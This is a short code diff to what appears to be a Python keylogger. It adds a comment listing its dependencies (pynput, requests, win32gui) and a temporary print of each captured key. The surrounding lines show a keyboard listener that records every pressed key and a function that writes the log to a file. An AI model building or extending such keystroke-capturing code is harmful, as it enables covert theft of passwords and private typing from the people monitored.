@@ -1,3 +1,7 @@
+"""
+Working on python 3.6.5
+Need to be installed: pynput, requests, win32gui, pywin32
+"""
 from pynput.keyboard import Key, Listener
 import time
 import os
@@ -43,6 +47,9 @@ def on_press(key):
         logged_data.append(substitution[substitution.index(key)+1])
     else:
         logged_data.append(key)
+
+    """temporary print to print pressed keys"""    
+    print(key)
 
 
 def write_file(count):
